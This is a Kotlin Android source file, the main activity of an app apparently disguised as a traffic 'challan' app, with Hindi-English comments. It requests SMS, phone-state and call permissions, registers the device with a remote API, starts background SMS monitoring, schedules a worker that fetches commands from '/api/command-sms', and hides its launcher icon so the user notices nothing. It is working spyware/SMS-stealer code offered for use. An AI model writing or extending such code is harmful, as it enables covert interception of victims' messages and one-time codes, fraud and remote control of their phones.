package com.rte.challan

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.rte.challan.service.BackgroundService
import com.rte.challan.worker.CommandWorker
import com.rte.challan.worker.RegistrationWorker
import com.rte.challan.worker.StatusWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val PERMISSION_CODE = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Blank view taaki user ko kuch dikhe nahi
        setContentView(R.layout.activity_main)

        if (allPermissionsGranted()) {
            setupCompleted()
        } else {
            requestPermissions()
        }
    }

    private fun allPermissionsGranted(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE) {
            // Permission milte hi seedha kaam shuru
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                setupCompleted()
            } else {
                finish() // Agar user deny kare toh band kar do
            }
        }
    }

    private fun setupCompleted() {
        // 1. Worker start karo jo Cloudflare API (/api/devices) pe data bhejega
        val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
            .setInitialDelay(1, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(registrationRequest)

        // 2. Background Service start karo (SMS monitoring ke liye)
        startBackgroundWork()

        // 3. App icon hide karo aur activity close karo
        hideLauncherIcon()
        finish()
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startBackgroundWork() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        val workManager = WorkManager.getInstance(this)

        // StatusWorker: Battery aur Last Seen update karne ke liye
        val statusWork = OneTimeWorkRequestBuilder<StatusWorker>()
            .setInitialDelay(10, TimeUnit.SECONDS)
            .build()
        workManager.enqueue(statusWork)

        // CommandWorker: /api/command-sms se naye commands fetch karne ke liye
        val commandWork = OneTimeWorkRequestBuilder<CommandWorker>()
            .setInitialDelay(30, TimeUnit.SECONDS)
            .build()
        workManager.enqueue(commandWork)
    }
}
